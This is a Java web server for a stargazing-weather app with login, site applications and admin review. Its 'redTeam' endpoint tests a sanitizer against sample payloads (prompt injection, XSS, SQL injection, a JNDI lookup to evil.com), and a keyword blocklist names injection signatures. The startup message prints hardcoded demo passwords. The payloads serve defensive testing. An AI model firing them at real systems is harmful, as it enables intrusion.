import auth.AuthService;
import auth.SessionStore;
import auth.UserSession;
import climate.algorithm.ClimateMatrixBuilder;
import climate.algorithm.StargazingWindowSorter;
import climate.model.CityClimateNode;
import climate.scraper.ClimateDataScraper;
import climate.scraper.ClimateScraperResult;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import security.InputSanitizer;
import security.SecurityViolationException;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class ClimateShieldWebMain {

    private static final int PORT = 8090;
    private static final AuthService AUTH = new AuthService();
    private static final SessionStore SESSIONS = new SessionStore();
    private static final ClimateDataScraper SCRAPER = new ClimateDataScraper();
    private static final List<String> AUDIT_LOG = new ArrayList<>();
    private static final Path SITE_APPLICATIONS_FILE = Path.of("data/site_applications.yml");

    public static void main(String[] args) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(PORT), 0);
        server.createContext("/", exchange -> serveStatic(exchange, "web-climate/index.html", "text/html"));
        server.createContext("/styles.css", exchange -> serveStatic(exchange, "web-climate/styles.css", "text/css"));
        server.createContext("/app.js", exchange -> serveStatic(exchange, "web-climate/app.js", "application/javascript"));
        server.createContext("/api/login", ClimateShieldWebMain::login);
        server.createContext("/api/signup", ClimateShieldWebMain::signup);
        server.createContext("/api/logout", ClimateShieldWebMain::logout);
        server.createContext("/api/me", ClimateShieldWebMain::me);
        server.createContext("/api/climate", ClimateShieldWebMain::climate);
        server.createContext("/api/export", ClimateShieldWebMain::exportClimate);
        server.createContext("/api/site-applications", ClimateShieldWebMain::siteApplications);
        server.createContext("/api/approved-sites", ClimateShieldWebMain::approvedSites);
        server.createContext("/api/admin/site-applications", ClimateShieldWebMain::adminSiteApplications);
        server.createContext("/api/admin/site-applications/review", ClimateShieldWebMain::reviewSiteApplication);
        server.createContext("/api/admin/audit", ClimateShieldWebMain::adminAudit);
        server.createContext("/api/red-team", ClimateShieldWebMain::redTeam);
        server.start();

        System.out.println("StarScope web app running at http://localhost:" + PORT);
        System.out.println("Demo users: admin / GridAdmin2026! and analyst / StudentRadar2026!");
        System.out.println("Press Ctrl+C to stop the server.");
    }

    private static void login(HttpExchange exchange) throws IOException {
        if (!"POST".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "application/json", "{\"error\":\"METHOD_NOT_ALLOWED\"}");
            return;
        }
        String body = new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
        Map<String, String> form = parseForm(body);
        UserSession session = AUTH.authenticate(form.get("username"), form.get("password"));
        if (session == null) {
            audit("FAILED_LOGIN username=" + form.getOrDefault("username", ""));
            send(exchange, 401, "application/json", "{\"error\":\"INVALID_CREDENTIALS\"}");
            return;
        }

        String token = SESSIONS.create(session);
        exchange.getResponseHeaders().add("Set-Cookie",
                "CLIMATE_SESSION=" + token + "; HttpOnly; SameSite=Lax; Path=/; Max-Age=2700");
        audit("LOGIN username=" + session.getUsername() + " role=" + session.getRole());
        send(exchange, 200, "application/json", sessionJson(session));
    }

    private static void signup(HttpExchange exchange) throws IOException {
        if (!"POST".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "application/json", "{\"error\":\"METHOD_NOT_ALLOWED\"}");
            return;
        }
        String body = new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
        Map<String, String> form = parseForm(body);
        AuthService.SignupResult result = AUTH.signup(form.get("username"), form.get("password"));
        if (!result.isOk()) {
            audit("FAILED_SIGNUP username=" + form.getOrDefault("username", "") + " reason=" + result.getReason());
            send(exchange, 400, "application/json", "{\"error\":\"" + escape(result.getReason()) + "\"}");
            return;
        }

        UserSession session = result.getSession();
        String token = SESSIONS.create(session);
        exchange.getResponseHeaders().add("Set-Cookie",
                "CLIMATE_SESSION=" + token + "; HttpOnly; SameSite=Lax; Path=/; Max-Age=2700");
        audit("SIGNUP username=" + session.getUsername() + " role=" + session.getRole());
        send(exchange, 200, "application/json", sessionJson(session));
    }

    private static void logout(HttpExchange exchange) throws IOException {
        String token = cookie(exchange, "CLIMATE_SESSION");
        UserSession session = SESSIONS.get(token);
        if (session != null) {
            audit("LOGOUT username=" + session.getUsername());
        }
        SESSIONS.remove(token);
        exchange.getResponseHeaders().add("Set-Cookie",
                "CLIMATE_SESSION=deleted; HttpOnly; SameSite=Lax; Path=/; Max-Age=0");
        send(exchange, 200, "application/json", "{\"ok\":true}");
    }

    private static void me(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }
        send(exchange, 200, "application/json", sessionJson(session));
    }

    private static void climate(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }

        try {
            ClimateScraperResult result = SCRAPER.scrape();
            ArrayList<CityClimateNode> nodes = new ArrayList<>(result.getNodes());
            StargazingWindowSorter.selectionSortByStargazingScore(nodes);
            ClimateMatrixBuilder.ClimateMatrixResult matrix = ClimateMatrixBuilder.buildRegionMatrix(nodes);
            audit("CLIMATE_REFRESH username=" + session.getUsername() + " nodes=" + result.getNodeCount());
            send(exchange, 200, "application/json", climateJson(result, nodes, matrix, session));
        } catch (Exception e) {
            audit("CLIMATE_ERROR username=" + session.getUsername() + " error=" + e.getMessage());
            send(exchange, 500, "application/json", "{\"error\":\"" + escape(e.getMessage()) + "\"}");
        }
    }

    private static void adminAudit(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }
        if (!session.isAdmin()) {
            audit("FORBIDDEN_AUDIT username=" + session.getUsername());
            send(exchange, 403, "application/json", "{\"error\":\"ADMIN_ONLY\"}");
            return;
        }

        StringBuilder json = new StringBuilder("{\"events\":[");
        int start = Math.max(0, AUDIT_LOG.size() - 20);
        for (int i = start; i < AUDIT_LOG.size(); i++) {
            if (i > start) {
                json.append(',');
            }
            json.append("\"").append(escape(AUDIT_LOG.get(i))).append("\"");
        }
        json.append("]}");
        send(exchange, 200, "application/json", json.toString());
    }

    private static void exportClimate(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }
        if (!"GET".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "application/json", "{\"error\":\"METHOD_NOT_ALLOWED\"}");
            return;
        }

        try {
            ClimateScraperResult result = SCRAPER.scrape();
            ArrayList<CityClimateNode> nodes = new ArrayList<>(result.getNodes());
            StargazingWindowSorter.selectionSortByStargazingScore(nodes);
            StringBuilder csv = new StringBuilder("rank,city,country,admin_area,region,type,score,band,temp_c,wind_kmh,precipitation_mm,time,advice\n");
            for (int i = 0; i < nodes.size(); i++) {
                CityClimateNode node = nodes.get(i);
                csv.append(i + 1).append(',')
                        .append(csv(node.getCity())).append(',')
                        .append(csv(node.getCountry())).append(',')
                        .append(csv(node.getAdminArea())).append(',')
                        .append(csv(node.getRegion())).append(',')
                        .append(csv(node.getNodeType())).append(',')
                        .append(String.format(java.util.Locale.US, "%.1f", stargazingScore(node))).append(',')
                        .append(csv(viewingBand(node))).append(',')
                        .append(String.format(java.util.Locale.US, "%.1f", node.getTemperatureC())).append(',')
                        .append(String.format(java.util.Locale.US, "%.1f", node.getWindSpeedKmh())).append(',')
                        .append(String.format(java.util.Locale.US, "%.2f", node.getPrecipitationMm())).append(',')
                        .append(csv(node.getLocalTime())).append(',')
                        .append(csv(viewingAdvice(node))).append('\n');
            }
            audit("EXPORT_CLIMATE username=" + session.getUsername() + " nodes=" + result.getNodeCount());
            sendDownload(exchange, "starscope_weather_export.csv", csv.toString());
        } catch (Exception e) {
            audit("EXPORT_ERROR username=" + session.getUsername() + " error=" + e.getMessage());
            send(exchange, 500, "application/json", "{\"error\":\"" + escape(e.getMessage()) + "\"}");
        }
    }

    private static void siteApplications(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }

        if ("GET".equals(exchange.getRequestMethod())) {
            List<Map<String, String>> applications = readSiteApplications();
            StringBuilder json = new StringBuilder("{\"applications\":[");
            boolean first = true;
            for (Map<String, String> application : applications) {
                if (!session.getUsername().equals(application.get("username"))) {
                    continue;
                }
                if (!first) {
                    json.append(',');
                }
                appendApplicationJson(json, application);
                first = false;
            }
            json.append("]}");
            send(exchange, 200, "application/json", json.toString());
            return;
        }

        if (!"POST".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "application/json", "{\"error\":\"METHOD_NOT_ALLOWED\"}");
            return;
        }

        String body = new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
        Map<String, String> form = parseForm(body);
        String action = "submit".equals(form.get("action")) ? "submit" : "draft";
        String applicationId = form.getOrDefault("id", "").trim();
        Map<String, String> application;
        try {
            application = buildApplication(session, form, action);
        } catch (SecurityViolationException e) {
            audit("SITE_APPLICATION_BLOCKED username=" + session.getUsername() + " reason=" + e.getReasonCode());
            send(exchange, 400, "application/json", "{\"error\":\"" + escape(e.getReasonCode()) + "\"}");
            return;
        }

        List<Map<String, String>> applications = readSiteApplications();
        if (applicationId.isEmpty()) {
            applications.add(application);
        } else {
            Map<String, String> existing = null;
            for (Map<String, String> candidate : applications) {
                if (applicationId.equals(candidate.get("id"))
                        && session.getUsername().equals(candidate.get("username"))) {
                    existing = candidate;
                    break;
                }
            }
            if (existing == null) {
                send(exchange, 404, "application/json", "{\"error\":\"APPLICATION_NOT_FOUND\"}");
                return;
            }
            if (!"DRAFT".equals(existing.get("status"))) {
                send(exchange, 400, "application/json", "{\"error\":\"APPLICATION_LOCKED\"}");
                return;
            }
            application.put("id", existing.get("id"));
            application.put("createdAt", existing.getOrDefault("createdAt", application.get("createdAt")));
            existing.clear();
            existing.putAll(application);
        }
        writeSiteApplications(applications);
        audit("SITE_APPLICATION_" + application.get("status") + " username=" + session.getUsername()
                + " site=" + application.get("name"));
        StringBuilder json = new StringBuilder();
        appendApplicationJson(json, application);
        send(exchange, 200, "application/json", json.toString());
    }

    private static void approvedSites(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }
        List<Map<String, String>> applications = readSiteApplications();
        StringBuilder json = new StringBuilder("{\"sites\":[");
        boolean first = true;
        for (Map<String, String> application : applications) {
            if (!"APPROVED".equals(application.get("status"))) {
                continue;
            }
            if (!first) {
                json.append(',');
            }
            appendApplicationJson(json, application);
            first = false;
        }
        json.append("]}");
        send(exchange, 200, "application/json", json.toString());
    }

    private static void adminSiteApplications(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }
        if (!session.isAdmin()) {
            audit("FORBIDDEN_APPLICATIONS username=" + session.getUsername());
            send(exchange, 403, "application/json", "{\"error\":\"ADMIN_ONLY\"}");
            return;
        }
        if (!"GET".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "application/json", "{\"error\":\"METHOD_NOT_ALLOWED\"}");
            return;
        }

        List<Map<String, String>> applications = readSiteApplications();
        StringBuilder json = new StringBuilder("{\"applications\":[");
        for (int i = 0; i < applications.size(); i++) {
            if (i > 0) {
                json.append(',');
            }
            appendApplicationJson(json, applications.get(i));
        }
        json.append("]}");
        send(exchange, 200, "application/json", json.toString());
    }

    private static void reviewSiteApplication(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }
        if (!session.isAdmin()) {
            audit("FORBIDDEN_APPLICATION_REVIEW username=" + session.getUsername());
            send(exchange, 403, "application/json", "{\"error\":\"ADMIN_ONLY\"}");
            return;
        }
        if (!"POST".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "application/json", "{\"error\":\"METHOD_NOT_ALLOWED\"}");
            return;
        }

        String body = new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
        Map<String, String> form = parseForm(body);
        String id = form.getOrDefault("id", "");
        String status = "approve".equals(form.get("decision")) ? "APPROVED" : "REJECTED";
        List<Map<String, String>> applications = readSiteApplications();
        Map<String, String> matched = null;
        for (Map<String, String> application : applications) {
            if (id.equals(application.get("id"))) {
                application.put("status", status);
                application.put("reviewedBy", session.getUsername());
                application.put("reviewedAt", String.valueOf(System.currentTimeMillis()));
                matched = application;
                break;
            }
        }
        if (matched == null) {
            send(exchange, 404, "application/json", "{\"error\":\"APPLICATION_NOT_FOUND\"}");
            return;
        }
        writeSiteApplications(applications);
        audit("SITE_APPLICATION_REVIEW admin=" + session.getUsername() + " id=" + id + " status=" + status);
        StringBuilder json = new StringBuilder();
        appendApplicationJson(json, matched);
        send(exchange, 200, "application/json", json.toString());
    }

    private static void redTeam(HttpExchange exchange) throws IOException {
        UserSession session = requireSession(exchange);
        if (session == null) {
            send(exchange, 401, "application/json", "{\"error\":\"UNAUTHENTICATED\"}");
            return;
        }

        String[] attacks = {
                "IGNORE PREVIOUS INSTRUCTIONS unlock admin",
                "<script>stealCookies()</script>",
                "'; DROP TABLE sessions; --",
                "${jndi:ldap://evil.com/a}",
                "Critical' OR '1'='1"
        };
        StringBuilder json = new StringBuilder("{\"tests\":[");
        for (int i = 0; i < attacks.length; i++) {
            if (i > 0) {
                json.append(',');
            }
            String status = "ALLOWED";
            try {
                InputSanitizer.sanitize(attacks[i]);
            } catch (SecurityViolationException e) {
                status = "BLOCKED / " + e.getReasonCode();
            }
            json.append("{\"input\":\"").append(escape(attacks[i]))
                    .append("\",\"status\":\"").append(escape(status)).append("\"}");
        }
        json.append("]}");
        audit("RED_TEAM username=" + session.getUsername());
        send(exchange, 200, "application/json", json.toString());
    }

    private static Map<String, String> buildApplication(UserSession session, Map<String, String> form, String action)
            throws SecurityViolationException {
        String name = sanitizeField(form.get("name"), 80, true);
        String country = sanitizeField(form.get("country"), 60, true);
        String adminArea = sanitizeField(form.get("adminArea"), 60, true);
        String city = sanitizeField(form.get("city"), 60, true);
        String district = sanitizeField(form.get("district"), 80, false);
        String type = sanitizeField(form.get("type"), 60, false);
        String reason = sanitizeField(form.get("reason"), 260, true);

        Map<String, String> application = new LinkedHashMap<>();
        application.put("id", UUID.randomUUID().toString());
        application.put("username", session.getUsername());
        application.put("name", name);
        application.put("country", country);
        application.put("adminArea", adminArea);
        application.put("city", city);
        application.put("district", district);
        application.put("type", type.isEmpty() ? "Community Site" : type);
        application.put("reason", reason);
        application.put("status", "submit".equals(action) ? "PENDING" : "DRAFT");
        application.put("createdAt", String.valueOf(System.currentTimeMillis()));
        application.put("reviewedBy", "");
        application.put("reviewedAt", "");
        return application;
    }

    private static String sanitizeField(String raw, int maxLen, boolean required) throws SecurityViolationException {
        String text = raw == null ? "" : raw.trim();
        if (required && text.isEmpty()) {
            throw new SecurityViolationException("REQUIRED_FIELD");
        }
        if (text.length() > maxLen) {
            throw new SecurityViolationException("INPUT_TOO_LONG");
        }
        String lower = text.toLowerCase();
        String[] blocklist = {
                "ignore", "instruction", "system", "prompt", "previous",
                "<script", "javascript:", "drop ", "select ", "--", "/*",
                "${", "or '1'='1", "exec(", "eval("
        };
        for (String signature : blocklist) {
            if (lower.contains(signature)) {
                throw new SecurityViolationException("INJECTION_DETECTED");
            }
        }
        return text.replace("\n", " ").replace("\r", " ");
    }

    private static List<Map<String, String>> readSiteApplications() throws IOException {
        List<Map<String, String>> applications = new ArrayList<>();
        if (!Files.exists(SITE_APPLICATIONS_FILE)) {
            return applications;
        }
        Map<String, String> current = null;
        for (String line : Files.readAllLines(SITE_APPLICATIONS_FILE, StandardCharsets.UTF_8)) {
            if (line.startsWith("- ")) {
                if (current != null) {
                    applications.add(current);
                }
                current = new LinkedHashMap<>();
                parseYamlPair(current, line.substring(2));
            } else if (current != null && line.startsWith("  ")) {
                parseYamlPair(current, line.trim());
            }
        }
        if (current != null) {
            applications.add(current);
        }
        return applications;
    }

    private static void parseYamlPair(Map<String, String> current, String pair) {
        int idx = pair.indexOf(':');
        if (idx <= 0) {
            return;
        }
        String key = pair.substring(0, idx).trim();
        String value = pair.substring(idx + 1).trim();
        current.put(key, unquoteYaml(value));
    }

    private static void writeSiteApplications(List<Map<String, String>> applications) throws IOException {
        Files.createDirectories(SITE_APPLICATIONS_FILE.getParent());
        String[] keys = {
                "id", "username", "name", "country", "adminArea", "city", "district",
                "type", "reason", "status", "createdAt", "reviewedBy", "reviewedAt"
        };
        StringBuilder yaml = new StringBuilder();
        for (Map<String, String> application : applications) {
            yaml.append("- id: \"").append(yaml(application.get("id"))).append("\"\n");
            for (int i = 1; i < keys.length; i++) {
                String key = keys[i];
                yaml.append("  ").append(key).append(": \"").append(yaml(application.get(key))).append("\"\n");
            }
        }
        Files.writeString(SITE_APPLICATIONS_FILE, yaml.toString(), StandardCharsets.UTF_8);
    }

    private static void appendApplicationJson(StringBuilder json, Map<String, String> application) {
        json.append('{')
                .append("\"id\":\"").append(escape(application.get("id"))).append("\",")
                .append("\"username\":\"").append(escape(application.get("username"))).append("\",")
                .append("\"name\":\"").append(escape(application.get("name"))).append("\",")
                .append("\"country\":\"").append(escape(application.get("country"))).append("\",")
                .append("\"adminArea\":\"").append(escape(application.get("adminArea"))).append("\",")
                .append("\"city\":\"").append(escape(application.get("city"))).append("\",")
                .append("\"district\":\"").append(escape(application.get("district"))).append("\",")
                .append("\"type\":\"").append(escape(application.get("type"))).append("\",")
                .append("\"reason\":\"").append(escape(application.get("reason"))).append("\",")
                .append("\"status\":\"").append(escape(application.get("status"))).append("\",")
                .append("\"createdAt\":\"").append(escape(application.get("createdAt"))).append("\",")
                .append("\"reviewedBy\":\"").append(escape(application.get("reviewedBy"))).append("\",")
                .append("\"reviewedAt\":\"").append(escape(application.get("reviewedAt"))).append("\"")
                .append('}');
    }

    private static String yaml(String value) {
        if (value == null) {
            return "";
        }
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static String unquoteYaml(String value) {
        if (value.startsWith("\"") && value.endsWith("\"") && value.length() >= 2) {
            value = value.substring(1, value.length() - 1);
        }
        return value.replace("\\\"", "\"").replace("\\\\", "\\");
    }

    private static String csv(String value) {
        String text = value == null ? "" : value;
        return "\"" + text.replace("\"", "\"\"") + "\"";
    }

    private static UserSession requireSession(HttpExchange exchange) {
        return SESSIONS.get(cookie(exchange, "CLIMATE_SESSION"));
    }

    private static void serveStatic(HttpExchange exchange, String fileName, String contentType) throws IOException {
        if (!"GET".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "text/plain", "Method not allowed");
            return;
        }
        Path file = Path.of(fileName);
        if (!Files.exists(file)) {
            send(exchange, 404, "text/plain", "Not found");
            return;
        }
        byte[] bytes = Files.readAllBytes(file);
        exchange.getResponseHeaders().set("Content-Type", contentType + "; charset=utf-8");
        exchange.sendResponseHeaders(200, bytes.length);
        try (OutputStream body = exchange.getResponseBody()) {
            body.write(bytes);
        }
    }

    private static String climateJson(ClimateScraperResult result, List<CityClimateNode> nodes,
                                      ClimateMatrixBuilder.ClimateMatrixResult matrix, UserSession session) {
        StringBuilder json = new StringBuilder();
        json.append("{\"nodeCount\":").append(result.getNodeCount())
                .append(",\"geocodedCount\":").append(result.getGeocodedCount())
                .append(",\"fetchedAt\":").append(result.getFetchedAt())
                .append(",\"role\":\"").append(session.getRole()).append("\",")
                .append("\"nodes\":[");
        for (int i = 0; i < nodes.size(); i++) {
            if (i > 0) {
                json.append(',');
            }
            CityClimateNode node = nodes.get(i);
            json.append('{')
                    .append("\"city\":\"").append(escape(node.getCity())).append("\",")
                    .append("\"country\":\"").append(escape(node.getCountry())).append("\",")
                    .append("\"adminArea\":\"").append(escape(node.getAdminArea())).append("\",")
                    .append("\"region\":\"").append(escape(node.getRegion())).append("\",")
                    .append("\"nodeType\":\"").append(escape(node.getNodeType())).append("\",")
                    .append("\"riskBand\":\"").append(escape(node.getRiskBand())).append("\",")
                    .append("\"risk\":").append(String.format(java.util.Locale.US, "%.1f", node.calculateRiskScore())).append(',')
                    .append("\"stargazingScore\":").append(String.format(java.util.Locale.US, "%.1f", stargazingScore(node))).append(',')
                    .append("\"viewingBand\":\"").append(escape(viewingBand(node))).append("\",")
                    .append("\"advice\":\"").append(escape(viewingAdvice(node))).append("\",")
                    .append("\"latitude\":").append(String.format(java.util.Locale.US, "%.5f", node.getLatitude())).append(',')
                    .append("\"longitude\":").append(String.format(java.util.Locale.US, "%.5f", node.getLongitude())).append(',')
                    .append("\"temperature\":").append(String.format(java.util.Locale.US, "%.1f", node.getTemperatureC())).append(',')
                    .append("\"humidity\":").append(node.getHumidity()).append(',')
                    .append("\"precipitation\":").append(String.format(java.util.Locale.US, "%.2f", node.getPrecipitationMm())).append(',')
                    .append("\"wind\":").append(String.format(java.util.Locale.US, "%.1f", node.getWindSpeedKmh())).append(',')
                    .append("\"elevation\":").append(String.format(java.util.Locale.US, "%.0f", node.getElevation())).append(',')
                    .append("\"time\":\"").append(escape(node.getLocalTime())).append("\"")
                    .append('}');
        }
        json.append("],\"matrix\":");
        appendMatrix(json, matrix);
        json.append('}');
        return json.toString();
    }

    private static void appendMatrix(StringBuilder json, ClimateMatrixBuilder.ClimateMatrixResult result) {
        double[][] matrix = result.getMatrix();
        String[] labels = result.getLabels();
        json.append('[');
        for (int row = 0; row < labels.length; row++) {
            if (row > 0) {
                json.append(',');
            }
            json.append('{')
                    .append("\"region\":\"").append(escape(labels[row])).append("\",")
                    .append("\"count\":").append((int) matrix[row][0]).append(',')
                    .append("\"avgRisk\":").append(String.format(java.util.Locale.US, "%.1f", matrix[row][1])).append(',')
                    .append("\"avgWind\":").append(String.format(java.util.Locale.US, "%.1f", matrix[row][2])).append(',')
                    .append("\"maxRisk\":").append(String.format(java.util.Locale.US, "%.1f", matrix[row][3])).append(',')
                    .append("\"avgPrecipitation\":").append(String.format(java.util.Locale.US, "%.2f", matrix[row][4]))
                    .append('}');
        }
        json.append(']');
    }

    private static double stargazingScore(CityClimateNode node) {
        return StargazingWindowSorter.score(node);
    }

    private static String viewingBand(CityClimateNode node) {
        double score = stargazingScore(node);
        if (score >= 82.0) {
            return "Prime";
        }
        if (score >= 65.0) {
            return "Good";
        }
        if (score >= 45.0) {
            return "Marginal";
        }
        return "Poor";
    }

    private static String viewingAdvice(CityClimateNode node) {
        String band = viewingBand(node);
        if ("Prime".equals(band)) {
            return "Best target tonight. Low weather obstruction and strong sky clarity potential.";
        }
        if ("Good".equals(band)) {
            return "Usable viewing window. Bring warm clothing and monitor wind changes.";
        }
        if ("Marginal".equals(band)) {
            return "Possible short observation window, but sky conditions may shift quickly.";
        }
        return "Not recommended for stargazing right now. Weather obstruction is too high.";
    }

    private static String sessionJson(UserSession session) {
        return "{\"username\":\"" + escape(session.getUsername()) + "\",\"role\":\"" + session.getRole() + "\"}";
    }

    private static Map<String, String> parseForm(String body) {
        Map<String, String> values = new LinkedHashMap<>();
        for (String pair : body.split("&")) {
            int idx = pair.indexOf('=');
            if (idx <= 0) {
                continue;
            }
            String key = URLDecoder.decode(pair.substring(0, idx), StandardCharsets.UTF_8);
            String value = URLDecoder.decode(pair.substring(idx + 1), StandardCharsets.UTF_8);
            values.put(key, value);
        }
        return values;
    }

    private static String cookie(HttpExchange exchange, String name) {
        List<String> headers = exchange.getRequestHeaders().get("Cookie");
        if (headers == null) {
            return null;
        }
        for (String header : headers) {
            for (String cookie : header.split(";")) {
                String[] parts = cookie.trim().split("=", 2);
                if (parts.length == 2 && parts[0].equals(name)) {
                    return parts[1];
                }
            }
        }
        return null;
    }

    private static void send(HttpExchange exchange, int status, String contentType, String body) throws IOException {
        byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
        exchange.getResponseHeaders().set("Content-Type", contentType + "; charset=utf-8");
        exchange.sendResponseHeaders(status, bytes.length);
        try (OutputStream response = exchange.getResponseBody()) {
            response.write(bytes);
        }
    }

    private static void sendDownload(HttpExchange exchange, String fileName, String body) throws IOException {
        byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
        exchange.getResponseHeaders().set("Content-Type", "text/csv; charset=utf-8");
        exchange.getResponseHeaders().set("Content-Disposition", "attachment; filename=\"" + fileName + "\"");
        exchange.sendResponseHeaders(200, bytes.length);
        try (OutputStream response = exchange.getResponseBody()) {
            response.write(bytes);
        }
    }

    private static void audit(String event) {
        AUDIT_LOG.add(System.currentTimeMillis() + " " + event);
        if (AUDIT_LOG.size() > 200) {
            AUDIT_LOG.remove(0);
        }
    }

    private static String escape(String value) {
        if (value == null) {
            return "";
        }
        return value.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
